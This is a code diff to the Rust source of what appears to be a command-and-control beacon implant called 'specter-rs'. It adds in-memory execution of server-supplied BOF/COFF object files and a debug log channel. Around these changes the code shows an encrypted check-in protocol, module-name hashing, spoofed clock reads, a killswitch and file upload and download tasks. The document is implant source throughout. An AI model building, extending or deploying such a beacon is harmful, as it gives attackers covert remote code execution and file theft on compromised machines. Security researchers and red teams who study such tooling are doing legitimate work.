@@ -74,6 +74,10 @@ pub struct Instance {
     pub download: Option<crate::tasks::DownloadState>,
     /// Active upload accumulation (one at a time).
     pub upload: Option<crate::tasks::UploadState>,
+    /// BOF runtime outputs waiting for the next POSTs (one BOF at a time).
+    pub bof_pending: Option<crate::coff::BofPending>,
+    /// Debug channel handle (0 = closed/absent; `config::DEBUG` builds).
+    pub debug_handle: isize,
 }
 
 /// Module name hashes, computed at compile time (lowercase; resolution is
@@ -246,7 +250,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         .checked_div(config::SLEEP_MS)
         .unwrap_or(0);
 
-    Some(Instance {
+    let mut instance = Instance {
         watermark: config::WATERMARK,
         ntdll,
         kernel32,
@@ -273,7 +277,13 @@ unsafe fn bootstrap() -> Option<Instance> {
         results_len: 0,
         download: None,
         upload: None,
-    })
+        bof_pending: None,
+        debug_handle: 0,
+    };
+    // Debug channel: open once, best effort (a failed open disables every
+    // log call silently — the beacon must never behave differently).
+    crate::runtime::debug::open(&mut instance);
+    Some(instance)
 }
 
 /// Read the current Unix epoch through the resolved clock — spoofed
@@ -381,6 +391,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         None => return,
     };
     instance.cycle = instance.cycle.wrapping_add(1);
+    crate::runtime::debug::log(instance, b"check-in: begin\n");
 
     // Beat envelope: base64(RC4(listener_key, watermark || id || beat)).
     // Buffers stay uninitialized (memset rule) — every byte is written by
@@ -432,6 +443,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     }
     let mut chunk: [u8; 64 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     crate::tasks::download_tick(instance, &mut w, &mut chunk);
+    crate::coff::bof_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
         return;
     }
@@ -494,6 +506,15 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     let mut queued: [u8; 512] = core::mem::MaybeUninit::uninit().assume_init();
     let mut w = Writer::new(&mut queued);
     while r.remaining() >= 8 {
+        // `execute bof`: the COFF image and the params blob borrow the
+        // response buffer — inline execution, exactly like SAVEMEMORY.
+        if r.peek_u32_le() == Some(transport::COMMAND_EXEC_BOF) {
+            match transport::parse_exec_bof(&mut r) {
+                Some(task) => crate::coff::exec(instance, &task, &mut w),
+                None => break,
+            }
+            continue;
+        }
         // SAVEMEMORY chunks carry up to a full upload piece: handle
         // them inline, the chunk borrows the response buffer.
         if r.peek_u32_le() == Some(transport::COMMAND_SAVEMEMORY) {
@@ -534,6 +555,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         i += 1;
     }
     instance.results_len = i;
+    crate::runtime::debug::log(instance, b"check-in: ok\n");
 }
 
 /// Beacon main, called by the entry stub. Never returns.
@@ -552,6 +574,7 @@ pub unsafe fn main() -> ! {
         },
     };
     store_instance(&mut instance);
+    crate::runtime::debug::log(&instance, b"specter-rs: bootstrap ok\n");
 
     loop {
         // Killswitch: checked once here (bootstrap, before any network
